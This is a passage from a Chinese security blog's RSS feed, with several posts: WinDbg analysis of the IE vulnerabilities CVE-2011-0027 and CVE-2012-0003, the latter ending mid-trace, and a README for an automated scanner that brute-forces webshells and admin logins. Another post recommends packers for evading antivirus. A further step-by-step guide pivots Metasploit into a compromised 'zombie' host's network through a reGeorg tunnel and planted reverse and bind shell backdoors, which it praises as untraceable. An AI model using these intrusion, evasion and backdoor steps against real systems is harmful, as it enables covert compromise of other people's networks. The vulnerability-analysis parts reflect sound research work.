&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在msf中search ms11-002或search cve-2011-0027都没有结果,这个漏洞要结合一个uaf漏洞来达到控制代码执行的目的,
msf中没有相关exp,google[site:exploit-db.com cve-2011-0027]或者在书中配套资料中可找到exp文件,该exp是个html
文件,对应exploit-db链接为:https://www.exploit-db.com/exploits/15984/

运行exploit-db中的exp,在win7x32+ie8和winXp(x32)+ie6下运行都失败,不能成功利用(代码中是弹出calc.exe),作者博客
中:
    http://vreugdenhilresearch.nl/ms11-002-pwn2own-heap-overflow/
提到:
    &quot;这当然需要你按照正确的顺序布局堆:[cachebuffer] [string] [objects]我设法做到这一点,它是工作和稳定的,
    当我在pwn2own机器上运行它,但它可能是只适用于特定的一个确切的IE8和Windows 7补丁版本

    另外:我只使用堆溢出的信息披露,但有足够的选项,将它变成RCE,至少对于WinXP,也可能为Windows 7.但对于实
    际的RCE我使用一个后免费的bug 几个月前补丁:
    http://www.microsoft.com/technet/security/bulletin/MS10-035.mspx

    我有几个版本的exp在我的硬盘,我不知道哪个是实际工作的最终版本,所以我只是把一个在这里.
    另外:我使用的DEP逃避是基于在pwn2opwn时与W7一起提供的msado.dll版本,基本上做了一个VirtualProtect调用我
    的Aligned堆喷雾,并把它可执行.

    记住,这是原始代码,它是在我很忙的时候写的,所以它是丑陋的,低效的,可能充满了奇怪的变量名. 此外,它需
    要Alex Sotirovs heapLib.js来运行.&quot;

很遗憾作者没有把通用的exp写出来或放出来,这里只学习其中的相关技术点
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-技术点&quot;&gt;0x01 技术点&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] 作者用的漏洞利用方法是通过在js中修改\00\00字符串终止符来越界访问对象的虚表指针的值来计算出模块基址然后构造
rop绕过dep,这里的技术点与下面链接中的第三个技术点相同,可参考下面链接
http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/

[+] 书中泉哥的分析漏洞的方法为经典的+hpa添加页堆的方法来分析,流程为:
a)+hpa
b)在windbg中得到中断位置为6887746f,具体如下:
6887746f 8906       mov     dword ptr [esi],eax ds:0023:088c8000=????????
c)此时要敏感地看看出错的内存位置是不是堆块中
!heap -p -a 88c8000分析发现出错的内存位置果然在堆块中,在该命令的结果中有关于这个堆块的栈信息,这应该是在这个堆块
在分配时的栈空间中esp附近的信息(被windbg保存了),通过查看!heap -p -a addr命令得到的与该堆块相关的栈中信息可以看
到函数调用过程,书中对应栈中数据大致为:
730d975d MSDART!MpHeapAlloc+0x00000029
6e5406e7 msado15!CRecordGroup::AllocateHRowRange+0x00000085
6e540650 msado15!CRecordset::PrepareForFetch+0x000000e2
...
这样的栈中数据可以判断出这个堆块在分配时依次调用过PrepareForFetch-&amp;gt;AllocateHRowRange-&amp;gt;MpHeapAlloc,因为在栈中的
数据为这三个函数的某个偏移(分别为+0x000000e2,+0x00000085,+0x00000029),说明在730d975d,6e5406e7,6e540650处的各个
对应的函数帧中的上一句汇编指令为call xxx格式的指令,这样才将call xxx指令的下一句指令的内存地址压栈,也即说明在堆
块分配时经历过这些函数

[+] UAF漏洞为&quot;释放后引用&quot;漏洞,发生在堆中,在free一块内存后,接着申请大小相同的一块内存,操作系统会将刚刚free掉的
内存再次分配给新申请的的动作,释放(free)的动作是为了再分配时可以预测新分配动作将得到的分配地址的情况,这样可以利
用js代码或其他方法将这个预测到的内存地址附近的内容修改为构造的内容,如果后面可以再引用(访问)释放的内存,这样就会
引用到被修改的内容,达到控制代码执行的目的.

[+] 汇编常见比较跳转指令小结如下:[AB无符号,GL有符号]
有符号指令    无符号指令    描述
JG            JA            大于则跳转
JNG           JNA           不大于则跳转
JGE           JAE           大于等于则跳转
JNGE          JNAE          不大于等于则跳转
JL            JB            小于则跳转
JNL           JNB           不小于则跳转
JLE           JBE           小于等于则跳转
JNLE          JNBE          不小于等于则跳转

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 24 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0027/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0027/</guid>
        
        <category>整数溢出</category>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>3xp10it自动化渗透测试框架1.0</title>
        <description>&lt;h3 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] legal disclaimer: Usage of 3xp10it.py and web.py for attacking targets without prior mutual consent is 
illegal.It is the end user's responsibility to obey all applicable local, state and federal laws.Developers
assume no liability and are not responsible for any misuse or damage caused by this program.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;install&quot;&gt;Install&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/3xp10it/3xp10it.git
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash beforeWork.sh[这一步安装相关依赖,第一次使用本工具时需要运行,以后不用再运行]
python3 3xp10it.py[主程序,工作时运行,第一次运行时需要先运行上面的beforeWork.sh]
python3 web.py[可选,如果运行则要新开一个终端运行以便于查看相关输出信息,该工具为web后台]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;requirement&quot;&gt;Requirement&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;need python3
need pip3
mysql
works on linux(test on ubuntu and kali2.0,others not test)

python3安装可参考如下步骤:
	apt-get install python3
	或:
	wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tar.xz
	tar xJf Python-3.5.2.tar.xz
	cd Python-3.5.2
	./configure --prefix=/opt/python3
	make &amp;amp;&amp;amp; make install
	ln -s /opt/python3/bin/python3.5 /usr/local/bin/python3
	
pip3安装:
apt-get install -y python3-pip

kali linux2安装pip3可参考如下步骤:
	echo &quot;deb-src http://http.kali.org/kali kali main non-free contrib&quot; &amp;gt;&amp;gt; /etc/apt/sources.list
	echo &quot;deb-src http://security.kali.org/kali-security kali/updates main contrib non-free&quot; &amp;gt;&amp;gt;
/etc/apt/sources.list
	apt-get update
	apt-get install python3-pip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;a)3xp10it是一个自动化渗透测试框架,目前没有做到完全自动化[自动上传漏洞利用框架和自动fuzz框架暂时没有加入]&lt;/p&gt;

&lt;p&gt;b)支持功能列表&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;cdn真实ip查找模块&lt;/li&gt;
  &lt;li&gt;旁站获取[如果在cdn模块中发现有cdn但是没有获取到真实ip则不进行旁站获取]&lt;/li&gt;
  &lt;li&gt;子站获取&lt;/li&gt;
  &lt;li&gt;高危漏洞扫描模块&lt;/li&gt;
  &lt;li&gt;爬虫模块&lt;/li&gt;
  &lt;li&gt;目标网站脚本类型检测&lt;/li&gt;
  &lt;li&gt;目录扫描模块&lt;/li&gt;
  &lt;li&gt;sqli扫描模块&lt;/li&gt;
  &lt;li&gt;robots/sitemap自动收集&lt;/li&gt;
  &lt;li&gt;cms识别与cms漏洞扫描模块&lt;/li&gt;
  &lt;li&gt;自动识别管理员页面并爆破[支持自动识别简单验证码]&lt;/li&gt;
  &lt;li&gt;webshell自动查找与爆破,支持asp,php,aspx,jsp,支持chopper一句话webshell和大马类型webshell&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)apache,iis,nginx,lighttpd在phpstudy中测试默认可接收1000个post参数  
b)一句话类型webshell根据上面的特点可以正常情况下(单线程)的1000倍速度来爆破,可用大字典爆破,但是不能用多线程,
  可能是因为用多线程会太快而让web server觉得每次的参数不止1000个  
c)其他类型web server未测试,暂用多线程1倍速爆破,用最常用的webshell较小字典,17659个左右  
d)大马类型webshell由于表单名是一定的,所以不能以1000倍速爆破,于是也用和c)中一样的小字典多线程1倍速爆破  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;资源文件收集&lt;/li&gt;
  &lt;li&gt;端口扫描模块&lt;/li&gt;
  &lt;li&gt;whois信息收集&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;c)可选工作模式&lt;/p&gt;

&lt;p&gt;模式一:扫描目标和目标的所有旁站&lt;br /&gt;
模式二:扫描目标和目标的所有子站&lt;br /&gt;
模式三:扫描目标和目标的所有旁站和所有子站&lt;br /&gt;
模式四:只扫描目标&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;默认使用模式一扫描[在运行3xp10it后可自选],上面四种模式中的[扫描目标]里的目标支持批量导入多个目标和手工录入多个
目标.四种工作模式中与旁站和子站相关的由程序自动完成[eg.选择模式三工作时,将自动获取导入的目标的所有旁站和所有子
站,并对这些旁站和子站依次遍历上面的各个扫描模块]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;d)特点&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;可在中断后重新运行时从断点附近接着上次的过程扫描,不用重新扫描&lt;/li&gt;
  &lt;li&gt;运行3xp10it后自动从数据库中取出待完成的扫描任务进行扫描&lt;/li&gt;
  &lt;li&gt;支持正常扫描和优先扫描两个扫描组,如果优先扫描组里有任务则先扫描优先扫描组里的目标,在添加任务时可选择将目标是
正常扫描还是优先扫描&lt;/li&gt;
  &lt;li&gt;上述支持功能列表中的功能默认全部遍历扫描,如果要使用单个模块可在web界面使用&lt;/li&gt;
  &lt;li&gt;3xp10it配备一个web后台,web页面可查询当前扫描结果与使用单个模块功能&lt;/li&gt;
  &lt;li&gt;3xp10it独立于web运行,也即没有目录下的pannel文件夹也可运行&lt;/li&gt;
  &lt;li&gt;目录下的pannel文件夹是Django为3xp10it写的一些相关界面,web界面使用在下面介绍&lt;/li&gt;
  &lt;li&gt;支持找到高危漏洞邮件通知[eg.sqli,webshell爆破成功等]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;e)web后台说明&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;web后台如下图,需要管理员身份登录才可进后台
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/login.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/web.png&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;web后台相当于3xp10it的部分界面+分割的模块化工具+exp10it中没有的功能的附加工具的集合&lt;/li&gt;
  &lt;li&gt;web后台由Django==1.10.3开发&lt;/li&gt;
  &lt;li&gt;web后台中支持工具列表
    &lt;ul&gt;
      &lt;li&gt;targets:查看扫描目标,新增/删除扫描目标&lt;/li&gt;
      &lt;li&gt;获取旁[子]站:获取旁站或子站模块&lt;/li&gt;
      &lt;li&gt;xcdn:尝试识别cdn背后的真实ip&lt;/li&gt;
      &lt;li&gt;高危漏扫:高危漏洞扫描模块&lt;/li&gt;
      &lt;li&gt;sqli:sql注入模块&lt;/li&gt;
      &lt;li&gt;扫目录:目录扫描模块&lt;/li&gt;
      &lt;li&gt;cms漏扫:cms漏洞扫描模块&lt;/li&gt;
      &lt;li&gt;webshell爆破:webshell爆破模块&lt;/li&gt;
      &lt;li&gt;管理员登录爆破:管理员登录爆破模块&lt;/li&gt;
      &lt;li&gt;waf爆破:waf自动爆破模块[3xp10it中没有这个功能]&lt;/li&gt;
      &lt;li&gt;dbquery:数据库语句执行接口&lt;/li&gt;
      &lt;li&gt;扫描结果:查看当前扫描结果&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.3xp10it需要用到bingapi,需要先申请好bingapi
2.上面的web.py不一定要运行,核心功能在3xp10it.py文件中
3.如果要后台功能需运行python3 web.py
4.如果要使用web.py,重新开机后需要重新运行web.py
5.运行web.py常见错误:端口被占用.解决方法:
a)netstat -ntlp | grep 8000
b)在a)中找到pid后kill -9 pid
c)重新运行python3 web.py
6.3xp10it中调用的是关键模块exp10it中的exp10itScanner,exp10it模块由pip3 install exp10it安装,安装路径一般如下:
/usr/local/lib/python3.5/dist-packages
7.文件分布结构如下:

当前目录
.
├── 3xp10it.py
├── pannel
│   ├── ghostdriver.log
│   ├── manage.py
│   ├── models.py[web后台没有用django的模型]
│   ├── pages[web页面的html文件,相当于django的template]
│   └── pannel[django相关文件]
│       ├── __init__.py
│       ├── settings.py
│       ├── urls.py[django配置的访问与响应规则]
│       ├── views.py[django配置的关键函数]
│       └── wsgi.py
├── readme.md
├── uninstall.py
└── web.py


/usr/local/lib/python3.5/dist-packages路径下相关文件

├── cms_identify[cms识别模块相关文件]
├── cms_scan[cms漏洞扫描模块相关文件]
├── config.ini[配置文件]
├── dicts[字典文件]
├── dirsearch[目录扫描模块相关文件]
├── exp10it.py[关键模块文件]
├── exps[exp模块相关文件]
├── log[日志文件夹]
├── tools[web后台中的各个工具]

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;faq&quot;&gt;FAQ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Q0:config.ini 这个文件怎么没有找到?
A0:config.ini在python3 3xp10it.py初次运行后会自动生成,用于设置bing API key,发邮件的帐号,数据库连接配置,扫描模式
   等信息,一般会在/usr/local/lib/python3.5/dist-packages/config.ini这里,与python3的安装路径有关
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;todo&quot;&gt;Todo&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;changelog&quot;&gt;Changelog&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] 修改exp10it.py中create table %s为create table `%s`[包括其他关于表名处的%s全部换成`%s`],如果没有``将会在表名
    为abc-def格式(中间有-符号)情况下建表失败
[+] 在与获取旁站有关的功能上自动尝试获取cdn后真实ip再获取旁站,如果确定有cdn但是没有获取到真实ip则不再获取假的旁
    站
[+] webshell爆破速度提升1000倍(接地气思路,适用于一句话类型webshell)
[+] 2017-01-06 添加支持如http://127.0.0.1/administrator页面的爆破,实际上http://127.0.0.1/administrator并不是
    直接的管理员页面,在浏览器中输入http://127.0.0.1/administrator后会跳转到&quot;http://127.0.0.1/administrator/&quot;,
    这才是有效的待爆破的管理员页面
[+] 2017-01-08 whois信息收集模块完善
[+] 2017-01-08 添加端口扫描模块
[+] 2017-01-08 cdn模块调整
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 23 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/23/3xp10it%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B61.0/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/23/3xp10it%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B61.0/</guid>
        
        <category>web</category>
        
        <category>scan</category>
        
        <category>framework</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>免杀</title>
        <description>&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://green-m.github.io/2016/11/15/meterpreter-bypass-av/

2.http://down.52pojie.cn/Tools/Packers/中WinLicense_x32_x64_v2.3.9.0_Repacked.7z加壳后可成功bypass av,其他壳目
前未测试,应该有几个也可以,如果一个壳不行则加多个壳
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/21/%E5%85%8D%E6%9D%80/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E5%85%8D%E6%9D%80/</guid>
        
        <category>免杀</category>
        
        <category>bypass</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>代理msf进内网</title>
        <description>&lt;h3 id=&quot;0x01-场景&quot;&gt;0x01 场景&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.肉鸡网络为内网环境,假设肉鸡ip为192.168.130.111
2.肉鸡内网中有一台开启公网web服务机器,假设提供对应http://rouji.com,假设运行aspx
3.尝试将msf用肉鸡的内网代理来控制目标内网
4.msf控制端网络环境任意,可为内网,假设ip为192.168.3.166[此192.168与上面肉鸡的192.168不是同一个内网下的192.168]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-准备&quot;&gt;0x02 准备&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;步骤如下:
1.上传reGeorg的tunnel.aspx到http://rouji.com/tunnel.aspx
2.控制端本地运行:python reGeorg.py -u http://rouji.com/tunnel.aspx -p 1080
3.控制端[假设为kali系统]:
apt-get install tsocks
vi /etc/tsocks.conf配置server地址为127.0.0.1,端口为1080
tsocks msfconsole
4.两种控制模式:
a)reverse类型payload连接
b)bind类型payload连接
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-reverse类型payload&quot;&gt;0x03 Reverse类型payload&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个reverse类型的exe,如下设置:
payload: windows/shell/reverse_tcp
rhost: 192.168.130.111[肉鸡本身的内网ip]
lport: 1234
假设生成houmen.exe

2.将lcx和上面生成的houmen.exe上传到肉鸡192.168.130.111,运行:
lcx -listen 300 1234
houmen.exe

3.在控制端msf中运行:
use multi/handler
set payload windows/shell/bind_tcp
set rhost 192.168.130.111
set lport 300
run -j

上面3个步骤完成后即可成功连接肉鸡

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x04-bind类型payload&quot;&gt;0x04 Bind类型payload&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个bind类型的exe,如下设置:
payload: windows/shell/bind_tcp
lport: 1111
假设生成houmen.exe

2.将houmen.exe上传到肉鸡192.168.130.111,运行:
houmen.exe

3.在控制端msf中运行:
use multi/handler
set payload windows/shell/bind_tcp
set rhost 192.168.130.111
set lport 1111
run -j

上面3个步骤完成后即可成功连接肉鸡
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x05-about&quot;&gt;0x05 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;优点:
1.两种houmen.exe都无法溯源
2.两种houmen.exe都可尝试用在目标网络环境有防火墙拦截规则下正常通信,将所有与肉鸡的通信流量变成控制端与肉鸡内网的一台
web服务器的正常通信
3.msf控制端可直接访问肉鸡内网所有资源(正常情况下要在控制一台肉鸡后将肉鸡设置为路由转发才由本地msf访问肉鸡内网)

遗憾:
就算是这样做,msf中的一些欺骗模块(eg.auxiliary/spoof/nbns/nbns_response)和其他的需要肉鸡设置为待访问资源的
模块(eg.各种ie漏洞模块)在目标内网环境中依然没有用,因为为msf使用目标内网代理只是增加了msf对目标内网的访问权限,并
没有使msf有目标内网其他机器可以访问msf的功能
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</guid>
        
        <category>msf</category>
        
        <category>proxy</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-0003</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;这个漏洞是由于微软的多媒体库winmm.dll(c:\windows\system32\winmm.dll)在处理MIDI文件时,由于对数据的处理不当导致的
堆溢出,攻击者可以在网页中嵌入特殊的MIDI文件来远程执行任意代码

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-准备工作&quot;&gt;0x01 准备工作&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;使用msf中的exp
    msfconsole
    search cve-2012-0003
    use exploit/windows/browser/ms12_004_midi
    set uripath test.html
    set payload windows/exec
    set cmd calc.exe
        server started
        http://192.168.118.129:8080/test.html
    奇怪的是在系统中不存在test.html,但是访问上面生成的网马链接确实会中马,后来查看msf中的exp:ms12_004_midi.rb,里
    面生成html的代码为
        send_response(cli, html, {'Content-Type'=&amp;gt;'text/html'})
    send_response函数在msfapi中有如下用法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Remote/HttpServer/HTML.html#send_response_html-instance_method&quot;&gt;msfapi_send_response&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    也即相当于msf内置webserver通过send_response函数发送html代码到客户端实现下面这个链接的访问
        http://192.168.118.129:8080/test.html
    这种方式比较特殊,可能msf的web是ruby的某个类似python下的Django的web框架开发的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-调试分析&quot;&gt;0x02 调试分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开iexplore.exe
win+r:cmd
gflags -i iexplore.exe +hpa
    这里如果在windbg中设置!gflag +hpa不会成功,可能是winxp或是windbg的问题
windbg:f6附加iexplore.exe
!gflag
    0:016&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
ie打开http://192.168.118.129:8080/test.html
	(180.6f8): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16a7f019 edi=16a7cf60
	eip=76b2d224 esp=3685fe80 ebp=3685fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16a7f019=??
    到这里只知道76b2d224处有内存访问异常,然而要想写出exp,还需要弄清参数传递过程,这个&quot;堆溢出&quot;cve的利用不是
    DWORD SHOOT,而是巧妙地构造html代码达到控制eip的目的,如果是利用堆溢出,一般会想到在上面访问异常时通过找到一个
    DWORD SHOOT的机会来覆盖异常处理相关的函数地址来控制eip,且要在可控数据复制到内存后找到堆分配调用

win+r:cmd
gflags -i iexplore.exe -hpa
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
    Breakpoint 0 hit
    eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=00216790 esi=00216780 edi=002167d8
    eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    WINMM!midiOutPlayNextPolyEvent:
    76b2d038 8bff            mov     edi,edi
    此时中断下来,再看看没有+hpa情况下的:WINMM!midiOutPlayNextPolyEvent+0x1ec会不会访问异常

bu WINMM!midiOutPlayNextPolyEvent+0x1ec
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=046de111 edi=025cd4f0
	eip=76b2d224 esp=0393fe80 ebp=0393fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:046de111=00
	此时中断下来,看到这里的[esi]与上面异常访问时的[esi]不同,考虑到启用页堆是在堆块后增加专门用于检测溢出的栅栏
	页,以便在堆溢出触及栅栏页时立刻触发异常,而+hpa和-hpa的情况下[esi]不同,应该不是由于页堆造成的[esi]的不同,猜
	测是由于WINMM!midiOutPlayNextPolyEvent+0x1ec处要执行多遍,而刚开始执行到WINMM!midiOutPlayNextPolyEvent+0x1ec
	时[esi]处是可以访问的,只是msf中设置好的exp数据在后面某一次程序执行到WINMM!midiOutPlayNextPolyEvent+0x1ec时
	[esi]产生了变化,并在+hpa时,[esi]属于页堆增加的栅栏页的地址范围才导致+hpa时在某次执行到
	WINMM!midiOutPlayNextPolyEvent+0x1ec时造成访问异常,为了验证这个想法,进行如下操作:

关闭windbg
重新打开ie
cmd:
	gflags -i iexplore.exe +hpa
打开windbg,f6加载iexplore.exe

bu WINMM!midiOutPlayNextPolyEvent+0x1ec
bu WINMM!midiOutPlayNextPolyEvent
g
ie打开http://192.168.118.129:8080/test.html
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff9d000 edx=16840f70 esi=16840f60 edi=16840fb8
	eip=76b2d038 esp=365bfbe0 ebp=365bfc0c iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
g
	Breakpoint 1 hit
	eax=00000000 ebx=ffffffff ecx=7ff98000 edx=16840f70 esi=16840f60 edi=16840fb8
	eip=76b2d038 esp=3690fea4 ebp=3690fedc iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent:
	76b2d038 8bff            mov     edi,edi
	这里看到WINMM!midiOutPlayNextPolyEvent第一次运行时不会经过+0x1ec的位置,在+1ec之前就返回了
g
	Breakpoint 0 hit
	eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=16842e51 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl nz na po nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16842e51=00
	这里看到第二次运行WINMM!midiOutPlayNextPolyEvent时第一次运行到+0x1ec处不会产生访问异常
g
	Breakpoint 0 hit
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16843019 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
	76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:16843019=??
	这里看到第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处访问异常([esi]不识别),g即可验证
g
	(51c.674): Access violation - code c0000005 (first chance)
	First chance exceptions are reported before any exception handling.
	This exception may be expected and handled.
	eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=16843019 edi=16840f60
	eip=76b2d224 esp=3690fe80 ebp=3690fea0 iopl=0         nv up ei pl zr na pe nc
	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
	WINMM!midiOutPlayNextPolyEvent+0x1ec:
